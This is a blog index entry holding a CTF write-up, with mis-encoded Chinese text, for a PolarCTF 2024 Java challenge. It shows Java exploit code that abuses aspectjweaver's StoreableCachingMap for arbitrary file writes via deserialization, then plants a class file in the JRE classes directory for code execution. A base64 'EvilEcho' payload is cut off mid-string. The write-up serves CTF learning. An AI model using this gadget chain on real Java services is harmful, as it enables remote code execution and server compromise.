<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>PolarCTF_2024ÁßãÂ≠£‰∏™‰∫∫ÊåëÊàòËµõ_Java</title>
      <link href="/2024/11/PolarCTF-2024%E7%A7%8B%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9B-Java/"/>
      <url>/2024/11/PolarCTF-2024%E7%A7%8B%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9B-Java/</url>
      
        <content type="html"><![CDATA[<h1 id="ÂâçË®Ä"><a href="#ÂâçË®Ä" class="headerlink" title="ÂâçË®Ä"></a>ÂâçË®Ä</h1><p>ÈÅáÂà∞‰∏§‰∏™‰πãÂâçÊ≤°ÁªÉËøáÁöÑJavaÈ¢òÁ±ªÂûãÔºåÂÅö‰∏Ä‰∏ãÂ≠¶Â≠¶</p><h1 id="‰∏ÄÂÜô‰∏Ä‰∏™‰∏çÂê±Â£∞"><a href="#‰∏ÄÂÜô‰∏Ä‰∏™‰∏çÂê±Â£∞" class="headerlink" title="‰∏ÄÂÜô‰∏Ä‰∏™‰∏çÂê±Â£∞"></a>‰∏ÄÂÜô‰∏Ä‰∏™‰∏çÂê±Â£∞</h1><aside>üí°<p>fatjar rce</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/image.png" alt="image.png"></p><p>Ê†πÊçÆÊèèËø∞ËÇØÂÆöÊòØÂ≠òÂú®‰∏Ä‰∏™‰ªªÊÑèÊñá‰ª∂ÂÜôÂÖ•ÁöÑÔºåÁúã‰æùËµñÊúâ‰∏™aspectjweaver-1.9.5.jarÔºåÁÆÄÂçïÂàÜÊûê‰∏Ä‰∏ãËøô‰∏™jarÁöÑ‰ªªÊÑèÊñá‰ª∂ÂÜôÂÖ•</p><p>Âú®\org\aspectj\weaver\tools\cache\SimpleCache.class‰∏ãÊúâ‰∏™ÂÜÖÈÉ®Á±ª<code>StoreableCachingMap</code> </p><p>Âú®ÈáåÈù¢ÁöÑputÊñπÊ≥ï‰∏≠Â≠òÂú®Êñá‰ª∂ÂÜôÂÖ•</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public <span class="title class_">Object</span> <span class="title function_">put</span>(<span class="params"><span class="built_in">Object</span> key, <span class="built_in">Object</span> value</span>) &#123;</span><br><span class="line">    <span class="title class_">IOException</span> e;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        e = <span class="literal">null</span>;</span><br><span class="line">        byte[] valueBytes = (byte[])((byte[])value);</span><br><span class="line">        <span class="title class_">String</span> path;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title class_">Arrays</span>.<span class="title function_">equals</span>(valueBytes, <span class="title class_">SimpleCache</span>.<span class="property">SAME_BYTES</span>)) &#123;</span><br><span class="line">            path = <span class="string">&quot;IDEM&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            path = <span class="variable language_">this</span>.<span class="title function_">writeToPath</span>((<span class="title class_">String</span>)key, valueBytes);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>Ë∑üËøõËøô‰∏™writeToPathÊñπÊ≥ï</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/image%201.png" alt="image.png"></p><p>ÂèØ‰ª•ÁúãÂà∞key‰Ωú‰∏∫Êñá‰ª∂ÂêçÔºå<code>this.folder + File.*separator</code>* ‰Ωú‰∏∫ÁõÆÂΩïÔºå<code>bytes</code> Âç≥putÁöÑvalue‰Ωú‰∏∫ÂÜÖÂÆπÁîüÊàê‰∫Ü‰∏Ä‰∏™Êñá‰ª∂ÔºåÁÆÄÂçïÂÜô‰∏Ä‰∏™payloadËØï‰∏Ä‰∏ã</p><p><code>StoreableCachingMap</code> Á±ªÁªßÊâø‰∫ÜHashMapÔºåÊâÄ‰ª•ÂèØ‰ª•Âà©Áî®HashMapËß¶Âèëput</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">package com.<span class="property">polar</span>.<span class="property">ctf</span>.<span class="property">payload</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.<span class="property">aspectj</span>.<span class="property">weaver</span>.<span class="property">tools</span>.<span class="property">cache</span>.<span class="property">SimpleCache</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.<span class="property">lang</span>.<span class="property">reflect</span>.<span class="property">Constructor</span>;</span><br><span class="line"><span class="keyword">import</span> java.<span class="property">nio</span>.<span class="property">charset</span>.<span class="property">StandardCharsets</span>;</span><br><span class="line"><span class="keyword">import</span> java.<span class="property">util</span>.<span class="property">HashMap</span>;</span><br><span class="line"></span><br><span class="line">public <span class="keyword">class</span> <span class="title class_">WriteFile</span> &#123;</span><br><span class="line">    public <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span>(<span class="title class_">String</span>[] args) throws <span class="title class_">Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="title class_">Class</span>&lt;?&gt; aClass = <span class="title class_">Class</span>.<span class="title function_">forName</span>(<span class="string">&quot;org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap&quot;</span>);</span><br><span class="line">        <span class="title class_">Constructor</span>&lt;?&gt; declaredConstructor = aClass.<span class="title function_">getDeclaredConstructor</span>(<span class="title class_">String</span>.<span class="property">class</span>, int.<span class="property">class</span>);</span><br><span class="line">        declaredConstructor.<span class="title function_">setAccessible</span>(<span class="literal">true</span>);</span><br><span class="line">        <span class="title class_">HashMap</span> hashmap = (<span class="title class_">HashMap</span>) declaredConstructor.<span class="title function_">newInstance</span>(<span class="string">&quot;D:\\desktop\\ctfËµõÈ¢ò\\2024\\2024ÁßãÂ≠£‰∏™‰∫∫ÊåëÊàòËµõPolarCTF\\‰∏ÄÂÜô‰∏Ä‰∏™‰∏çÂê±Â£∞\\web\\com\\polar\\ctf\\payload&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        hashmap.<span class="title function_">put</span>(<span class="string">&quot;1.txt&quot;</span>,<span class="string">&quot;test&quot;</span>.<span class="title function_">getBytes</span>(<span class="title class_">StandardCharsets</span>.<span class="property">UTF_8</span>));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/image%202.png" alt="image.png"></p><p>ÊàêÂäüÂÜôÂÖ•ÔºåÂÖ∂ÂÆûËøôÈáåÂ∞±ÂèØ‰ª•ÁªìÂêàCCÔºå‰ΩÜÊòØÊú¨È¢ò‰∏≠Ê≤°ÊúâCC‰æùËµñÔºåÊâÄ‰ª•ÂæóÊâæ‰∏™ËÉΩËß¶ÂèëputÊñπÊ≥ïÁöÑÔºåÈ¢òÁõÆËøôÈáåËá™Â∑±ÂÜô‰∫Ü‰∏™Ëß¶ÂèëputÁöÑÁ±ª</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/image%203.png" alt="image.png"></p><p>ÊâÄ‰ª•Âà©Áî®Ëøô‰∏™readObjectÂç≥ÂèØ</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">package com.<span class="property">polar</span>.<span class="property">ctf</span>.<span class="property">payload</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.<span class="property">polar</span>.<span class="property">ctf</span>.<span class="property">bean</span>.<span class="property">UserBean</span>;</span><br><span class="line"><span class="keyword">import</span> org.<span class="property">aspectj</span>.<span class="property">weaver</span>.<span class="property">tools</span>.<span class="property">cache</span>.<span class="property">SimpleCache</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.<span class="property">io</span>.<span class="property">ByteArrayOutputStream</span>;</span><br><span class="line"><span class="keyword">import</span> java.<span class="property">io</span>.<span class="property">IOException</span>;</span><br><span class="line"><span class="keyword">import</span> java.<span class="property">io</span>.<span class="property">ObjectOutputStream</span>;</span><br><span class="line"><span class="keyword">import</span> java.<span class="property">lang</span>.<span class="property">reflect</span>.<span class="property">Constructor</span>;</span><br><span class="line"><span class="keyword">import</span> java.<span class="property">nio</span>.<span class="property">charset</span>.<span class="property">StandardCharsets</span>;</span><br><span class="line"><span class="keyword">import</span> java.<span class="property">util</span>.<span class="property">Base64</span>;</span><br><span class="line"><span class="keyword">import</span> java.<span class="property">util</span>.<span class="property">HashMap</span>;</span><br><span class="line"></span><br><span class="line">public <span class="keyword">class</span> <span class="title class_">WriteFile</span> &#123;</span><br><span class="line">    public <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span>(<span class="title class_">String</span>[] args) throws <span class="title class_">Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="title class_">Class</span>&lt;?&gt; aClass = <span class="title class_">Class</span>.<span class="title function_">forName</span>(<span class="string">&quot;org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap&quot;</span>);</span><br><span class="line">        <span class="title class_">Constructor</span>&lt;?&gt; declaredConstructor = aClass.<span class="title function_">getDeclaredConstructor</span>(<span class="title class_">String</span>.<span class="property">class</span>, int.<span class="property">class</span>);</span><br><span class="line">        declaredConstructor.<span class="title function_">setAccessible</span>(<span class="literal">true</span>);</span><br><span class="line">        <span class="title class_">Object</span> o = declaredConstructor.<span class="title function_">newInstance</span>(<span class="string">&quot;D:\\desktop\\ctfËµõÈ¢ò\\2024\\2024ÁßãÂ≠£‰∏™‰∫∫ÊåëÊàòËµõPolarCTF\\‰∏ÄÂÜô‰∏Ä‰∏™‰∏çÂê±Â£∞\\web\\com\\polar\\ctf\\payload&quot;</span>, <span class="number">1</span>);</span><br><span class="line"><span class="comment">//        hashmap.put(&quot;1.txt&quot;,&quot;efaefwafa&quot;.getBytes());</span></span><br><span class="line"></span><br><span class="line">        <span class="title class_">String</span> age = <span class="title class_">Base64</span>.<span class="title function_">getEncoder</span>().<span class="title function_">encodeToString</span>(<span class="string">&quot;1212&quot;</span>.<span class="title function_">getBytes</span>());</span><br><span class="line"></span><br><span class="line">        <span class="title class_">UserBean</span> userBean = <span class="keyword">new</span> <span class="title class_">UserBean</span>(<span class="string">&quot;2.txt&quot;</span>,age,o);</span><br><span class="line">        byte[] bytes = <span class="title function_">serialize</span>(userBean);</span><br><span class="line"></span><br><span class="line">        <span class="title class_">System</span>.<span class="property">out</span>.<span class="title function_">println</span>(<span class="title class_">Base64</span>.<span class="title function_">getEncoder</span>().<span class="title function_">encodeToString</span>(bytes));</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="keyword">static</span> byte[] <span class="title function_">serialize</span>(<span class="title class_">Object</span> obj) throws <span class="title class_">IOException</span> &#123;</span><br><span class="line">        <span class="title class_">ByteArrayOutputStream</span> baos = <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="title class_">ObjectOutputStream</span> oos = <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.<span class="title function_">writeObject</span>(obj);</span><br><span class="line">        <span class="keyword">return</span> baos.<span class="title function_">toByteArray</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/image%204.png" alt="image.png"></p><p>Êú¨Âú∞‰πüÊòØÊàêÂäüÂèçÂ∫èÂàóÂåñÂÜôÂÖ•Ôºå‰ªªÊÑèÊñá‰ª∂ÂÜôÂÖ•ÊàêÂäü‰∫ÜÔºåÊé•‰∏ãÊù•Â∞±ÊòØËøô‰∏™È¢òÁõÆÁöÑÈáçÁÇπ‰∫ÜÔºåfatjar‰∏ãrce</p><p>Êú¨È¢òÊòØÂæÄclasses‰∏ãÂÜô‰∏Ä‰∏™classÊñá‰ª∂ÔºåÁÑ∂ÂêéÂà©Áî®ÂèçÂ∫èÂàóÂåñÂéªÂä†ËΩΩËøô‰∏™Â≠óËäÇÁ†ÅÔºàÁúüÂÆûÁéØÂ¢É‰∏ãclassesÈªòËÆ§‰∏çÂ≠òÂú®Ôºâ</p><p>ÂÜôÂÖ•Â≠óËäÇÁ†Åexp</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">package com.<span class="property">polar</span>.<span class="property">ctf</span>.<span class="property">payload</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.<span class="property">polar</span>.<span class="property">ctf</span>.<span class="property">bean</span>.<span class="property">UserBean</span>;</span><br><span class="line"><span class="keyword">import</span> com.<span class="property">sun</span>.<span class="property">org</span>.<span class="property">apache</span>.<span class="property">bcel</span>.<span class="property">internal</span>.<span class="property">Repository</span>;</span><br><span class="line"><span class="keyword">import</span> org.<span class="property">aspectj</span>.<span class="property">weaver</span>.<span class="property">tools</span>.<span class="property">cache</span>.<span class="property">SimpleCache</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.<span class="property">io</span>.<span class="property">ByteArrayOutputStream</span>;</span><br><span class="line"><span class="keyword">import</span> java.<span class="property">io</span>.<span class="property">IOException</span>;</span><br><span class="line"><span class="keyword">import</span> java.<span class="property">io</span>.<span class="property">ObjectOutputStream</span>;</span><br><span class="line"><span class="keyword">import</span> java.<span class="property">lang</span>.<span class="property">reflect</span>.<span class="property">Constructor</span>;</span><br><span class="line"><span class="keyword">import</span> java.<span class="property">nio</span>.<span class="property">charset</span>.<span class="property">StandardCharsets</span>;</span><br><span class="line"><span class="keyword">import</span> java.<span class="property">util</span>.<span class="property">Base64</span>;</span><br><span class="line"><span class="keyword">import</span> java.<span class="property">util</span>.<span class="property">HashMap</span>;</span><br><span class="line"></span><br><span class="line">public <span class="keyword">class</span> <span class="title class_">WriteFile</span> &#123;</span><br><span class="line">    public <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span>(<span class="title class_">String</span>[] args) throws <span class="title class_">Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="title class_">Class</span>&lt;?&gt; aClass = <span class="title class_">Class</span>.<span class="title function_">forName</span>(<span class="string">&quot;org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap&quot;</span>);</span><br><span class="line">        <span class="title class_">Constructor</span>&lt;?&gt; declaredConstructor = aClass.<span class="title function_">getDeclaredConstructor</span>(<span class="title class_">String</span>.<span class="property">class</span>, int.<span class="property">class</span>);</span><br><span class="line">        declaredConstructor.<span class="title function_">setAccessible</span>(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">//        HashMap o = (HashMap) declaredConstructor.newInstance(&quot;/usr/lib/jvm/java-8-openjdk-amd64/jre/classes/&quot;, 1);</span></span><br><span class="line">        <span class="title class_">Object</span> o =  declaredConstructor.<span class="title function_">newInstance</span>(<span class="string">&quot;/usr/lib/jvm/jdk1.8.0_65/jre/classes&quot;</span>, <span class="number">1</span>);</span><br><span class="line"><span class="comment">//        hashmap.put(&quot;1.txt&quot;,&quot;efaefwafa&quot;.getBytes());</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//        String age = Base64.getEncoder().encodeToString(&quot;1212&quot;.getBytes());</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//        String age = &quot;yv66vgAAADQAjgoABgBHCABICgAEAEkHAEoKAAQASwcATAoATQBOBwBPCgAIAEcHAFAKAAoAUQoACgBSCQBTAFQHAFUKAFYAVwoACABYCgBZAFoKAA4AWwoAXABdBwBeCgAUAF8IAGAIAGEHAGIKAAYAYwgAZAoABABlCgBmAGcKAAQAaAcASAcAaQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAKTEV2aWxFY2hvOwEABG1haW4BABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWAQAJZXZpbENsYXNzAQARTGphdmEvbGFuZy9DbGFzczsBAAxldmlsSW5zdGFuY2UBABJMamF2YS9sYW5nL09iamVjdDsBAAVidG91dAEAH0xqYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbTsBAAZvYmpPdXQBABxMamF2YS9pby9PYmplY3RPdXRwdXRTdHJlYW07AQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEABGFyZ3MBABNbTGphdmEvbGFuZy9TdHJpbmc7AQAWTG9jYWxWYXJpYWJsZVR5cGVUYWJsZQEAFExqYXZhL2xhbmcvQ2xhc3M8Kj47AQANU3RhY2tNYXBUYWJsZQcAXgEACnJlYWRPYmplY3QBAB4oTGphdmEvaW8vT2JqZWN0SW5wdXRTdHJlYW07KVYBAANvaXMBABtMamF2YS9pby9PYmplY3RJbnB1dFN0cmVhbTsBAARjb2RlAQASTGphdmEvbGFuZy9TdHJpbmc7AQALY2xhc3NMb2FkZXIBADNMY29tL3N1bi9vcmcvYXBhY2hlL2JjZWwvaW50ZXJuYWwvdXRpbC9DbGFzc0xvYWRlcjsBAA9sb2FkQ2xhc3NNZXRob2QBABpMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAC2xvYWRlZENsYXNzAQAKRXhjZXB0aW9ucwEAClNvdXJjZUZpbGUBAA1FdmlsRWNoby5qYXZhDAAgACEBAAhFdmlsRWNobwwAagBrAQAPamF2YS9sYW5nL0NsYXNzDABsAG0BABBqYXZhL2xhbmcvT2JqZWN0BwBuDABvAHABAB1qYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbQEAGmphdmEvaW8vT2JqZWN0T3V0cHV0U3RyZWFtDAAgAHEMAHIAcwcAdAwAdQB2AQAQamF2YS9sYW5nL1N0cmluZwcAdwwAeAB7DAB8AH0HAH4MAH8AgAwAIACBBwCCDACDAIQBABNqYXZhL2xhbmcvRXhjZXB0aW9uDACFACEBDX8kJEJDRUwkJCRsJDhiJEkkQSRBJEEkQSRBJEEkQSQ4ZFYkNWJXJFRXJFUkZmUkOGUkcSQ5OWEkWUQkQyRJJGYxUiRjMWskNDBNJGM0JGJiJDQwJGFkJElYJGFjJEIkYWRBJHYkYTJtJDg3JGUxJEEkRCQ5MyQ5OTgzJEIkYjQkZjckN2JrbyRmNmZrJGVkJGNkJGRhJGQ2diRmNSRjOSQ5NyRlOGokOTckYWUkM2UkZjckYTEkN2QkZTlrJDlmJGZhJGQ0JGJlJGY0JGwkZDQkZWUkOTNJNCRSJGFjZSR6JGY2OWdfJGNlJGRlJGZiJGRiJDdiJDlmJGNjJGNmJGZmJGZjcCREJGMwViQ3YyRhNyRhMCRpJDg3JFUkM2MkOGMkYzMkODIkcWUkTSR1OCQ4MiRhMzIkRyRyJDNjJGEyJDQwJGMyJDkwJDg0YyRLJDg2cSQ1YyRjNiRKJFokOGYkY2F4TCRjNiRlMzI0JG4kaCQ5MSRhMSRjYiRZJDk1JGMwJDg1JGM2JDk4JDhjcSRaJFQkSyRNTCR3JGE4JGMxJDk0JE1TJGFjJHYkWiQ5NiRNJDViRlo4JDNiJHYkYzMkOTEkZTAkdyRmMCQ5MCRSZFokYzEkTWYkVjQkZTIkOTQkOGMkZDNiJDdkQiQ5MCR0ZSQzYyRyJGUzaSRKJGNmJHVoJGMxJGIzJFMkOWVjJEl1JFkkOTYkZTEkZWRmJHUkOGI2JGxlJEl0JGQ5JGEzJDljJGExJHdhWCRiYyQzZiQ5MyRnJGUxJGNlJDgwNmIkUyR0JDljJGIwdSRjZCQzYyRhYTkkODY4JGU3JDk5JEJvJGMycCRaViR0bGckM2MkY2VnJGI1VCRkYSRlNHEkY2RNcyRkZCQ5YiQ5YyRlMSRkYTR3JGUyJDdiJGJieiRTJDNkJGZhJDg0JGRkJGNlJG13JGU4ZiRkZSRkOSQ4MiRlOU0kTSRkNSQ4OUltWiQ4YiQ5YiQ5YTUkayRlZjI1JGQ3bSRYJDgyViQ4NiRyRSRDJDg3JDhmJDk5dCQ1ZCRiYyQ4ZiQ3YiRUJGY2aE5jJGIzJDg4JGU2JGI2JGM2JGMxJDkxSVIkYzhJJGI2JEkkYjJVJDkwbSQ4MmwkWGQkODckbSQzYiRGJGQ5VWokOTckZjQkaSRjMyRnJHQkYmIkYjIkZTlWJDhhJGE2ZngkM2VZcFpzWiR2JGE0JGJhJG9hJGNmJGFjJGNlJGQzJDllYSQ1YiRxJGFmTHokOWEkM2UkZDUkYTckYTVzJDg4UHkkciQzY08kYzUkYTUkZWFJJGU4JHMkYTAkWiQ5NCRhNCQ5ZHF0JGJlJGNmJFEkODBVJFckZTAkODgkODkkZWJUbERMJGMyJEwkdyQ1ZSRjNEskdyQ1ZSRjNiR4JE0kaiRFZSRjY00kTCRmN2MkOGUkOTYkZTIzJGI2MyRWJDliJGUxJHAxJGRkJGI2JDNjJDNlJGViJGM1JGkkN2UyJGMzJDVkJF92JGQ4XyRiYiQ3Y3YkYWZtJDhlciRlYSQ4MVdVJGJjJDg2MyRNJGI1JGUzJGRjJGNia3R6JDk0JGNjSCRjNiRlM1QkYTkkYWEkM2IkUVckZjEkM2EkZGUkNjBYdCR0JDlhJDk0JDg1JDhhNyRmMSRXJGMzJDllJGZmJGhPJDkyJDNiJGQzJGU2JGJjTiR4ciRiMSRiOGkkZGJyJEokQyRlNXZkJE0kY2IkODUkZTMkZDkkOTgkZWIkZGIkZGUkYmUkYTMkYTAkNWNOJGNhJDgzJDhlJGUxcUckYzUkZGIkbyRkMjUkYTUkRyRUJDllJDk3JDhlJGY1JFMkdiRmNSRlZSRoJGY2ciQ4ZDAkdiRjOSRjZSRhZiRhYiQ4YSRiM3gkODckZWEkYWUkYTdGJFokcSRkYiQ4ZFkkOTQkOTgkODR3VSRiYyQ4NyRmN1UkN2MkODBzJHEkaSRkYyRkZiRhZiRlMkMkN2NEJDlkJFQkZDdJJHokM2ViWHF3JDgyJDhlJGh1JFYkZTckZjExJGYxJEUkeSQ5ZWlRJHgkZTckNWNkJDNjJGMzJDhjJHR1JGNkJGIyRCR2JCQkYTgkZjgkRSQ5ZiRhYSRmOCRNJDlmSyRmOEIkYzVFJDdjJHYkSyQ3ZSQ4OW44JGRlJGE5JGUyJHgkN2MkYWQkZTIkaCRlMSR3OGZmJGM0JGM1QSRkZCRiNCR6SiRiYWYkOWVWU3EkWiRkZjIkYWMkYmMkZjckYTAxNCRkY216SiRhMCRZJDk4cCRJJGxqSSQzZCRlMzgkZGMkZjIkSyRlNyRkYWhzJGUyTiR6aiRmNCQzYSRDNCRkZmskYjkkY2VJJGQ4JDNlJGI4JDkxJFMkZjUkbyQ5MSRiMCQ5OVckNDAkYzUxaSQ5MyRlM1BBJGEzcyRjN24kY2UkOGQkZWQkN2VBJExZJGVjJDk5JGM3ZngkOGVNJGYzJDdmJGJkJG8kbiRjMyQ5YSRiNiRhNyRJJGVjJDVkJGQxJGI5TyRjOSRmMCQ1Y1YkZjMkN2MkUE41JGM1JGQ0JGNkdVNzJGY4aCRuJGI2SiQ5NyQ3YiQ5ZCRiYSRjZSQ1ZCRkNyRmMCQ5ZiRjOCRlODEkZjEkYWUkVyRmNyRlMCR2JGQ3JGUzJHYkN2YkeSRPOXYkOWEkM2IkZGUkdiQ4NiRiNSRmNyRjMCRlMSRkNiQ4YlQkZTEkZDlHJGQyZCRkNCRhNSQ4OSRCJHYkYWQkZDYkeiRyWUwkYTdmWCRFJGYwJGQyJGUyJDhiJGJiJHM0JHQkdmYkYzQkZDJ5JDdiJGYzMVIkVWUkZjUkeFEzJGI3JDkyJGVkJDg1JGNlJGNlJGIxJE9nJHkkY2ZIJFZGJGI4cCRhOCR4MSRjYiRiMyRjOTAkYzBnOSRjZE00JDNhJGNmJGJiWmxBJFEkSSRiNEokNWQkZTUkOTkkTSRMJGM5JGQ1JDdlJHgkOWQkZjEkYzgkOTJrJDg0WiQ3ZCRjMSQ5ZGEkYzckOGIkRWQkZGUkUSQ5ZFckbSRkMFczJCQkZWYkZTYkYTYkOTEkUyRfJEokYzMkYmEkYmJjJDVkJDNjJGMyJG8kSiQ4YiRmYSQ5ZCQ4YUpRJGU0JGskZmEkQkckZDMkdiRlNyRjNmhzaVYkRlEkOGYkYzlTNEskZWRoJGMyJEckZmEkNWQkVyQ3ZiRMJGMwJGM0M080TiRhNzgkYWQkOGMkZDYkNjAkY2JVJGIwJHg5JGYxJHMkYTIkYTEkaTMkODRWJGEyJGFhJGFmJDgwJGNkJGQ4QiRhYkwkbCRVeSRlMyRGJGRmJGQzJDk1JFYkQSRkMyRhZmFBJFdlJGUxJDQwJFckYzEkRCR6JGUxUCRkOXVIWSRjOCQ4OSRmNSQ4Y3YkZTVZJHUkN2R5JDg1JEtfQSR6JHUkYjQkODQkeCRmMyRkYiRmZSRmNSRoJGYyJGJhbSQ4MSQ4ZCRiNyRiNiRjMSRiYyRkZEIkYjIkTFckZjkkYWEkOGIkZGFCeW4kYjUkZTAkODYkRCRjNCRqJHckTCRkNyRxJDg1SCQ4YUgkVURtJHEkZTQkZDNIJGEwcCQ5MyRpJDkxJG9BUiR6JHQkZDUkM2FSVSQ3ZUJNJDVieSRlOCQzYVEkciRiYyRmOCRnJGVhJGIzaCRJRyRiMlhyJGskZTEkODgkb3Qkb0okbSRiYzR5JFpVJGUyJGI4JHl3JDVjTjQkWSR2T0YkZTQkeSRlZSRMJGFmJHUkZjYkaSQ5MSRmZCRjYiQ3ZkQkZTMkZDA1NEUkOTQkeVZmJGIxJGVhJHdWJDg3JGQ3ZCRiMTYkOGJ1JGMyJGU5JGEwbyRaJGNkZyRTJDkxJGYzJGUxJGU1JGY5JGNkcyRmOCQ5N1EkN2UkYTAkciQ4YiRmNSQ4M1dEJFIkZDgkUSQzYk4kbEplJGI5JFM5WEYkYjQkOWMkY2EkYTMkYTAkOWUkY2EkZDAkRSRmMSQ5YVdiJHQkVyRhMiRMVSRlOCRjNyRvJE0kYTEkZzYkYzI4Q19oZ1EkOGJzJGE4JGMzJHIkeSRHJGU1JDhiJGhoJGMwJF8kODgkZTA3JHkkYzEkZWZ0JGQ3JGxYJDhlJDNmJGIxJEMkN2YkYTMkOTE1JGEzJDg5dWIkciRoJGMyJGckZjIkYjgkOGEkOWQkYzBqNiQ4MiRiNSRiOXY4TSQ3ZVQkZDYkODdtJGQ4TiRhN3okYjYkWCQzYiRjOCR0JHAkOGIkOWQkZDgkODU2aiRhMCQkJGI2JFkkZWQkYzQkeEMkM2YkYWIkNDAkSCRmMSRDJFkkYTIkZjAkZWYkYTckNWQkOTAkZTIkZjkkTCRiYkkkZyRhMiRhOCQ3ZSRjNSREJGI0JDkzJHUkYTYkeSRmNiQ5MFQkYTYkYzgkJCRhMiRUJDdiJHYkYWYkaCRiOCQ0MHl0QyRuJGVmQSRmNCQ2MCRseSQ3YiQ5MCRmZSRiNyRwcCQ5MyRDJGFlJDkwJGQwJHhhJGJmJDg0JDg3JEskZDQkZGYkZjgkZmIkRCRTJFMkNDAkYzVNQiQ4OSQ2MCQ5MyRkMCRYJGE0JEkkZmJzJGVkJDdkJGYwX2ckZjlqJGskWSRMJEEkQQEAMWNvbS5zdW4ub3JnLmFwYWNoZS5iY2VsLmludGVybmFsLnV0aWwuQ2xhc3NMb2FkZXIBADFjb20vc3VuL29yZy9hcGFjaGUvYm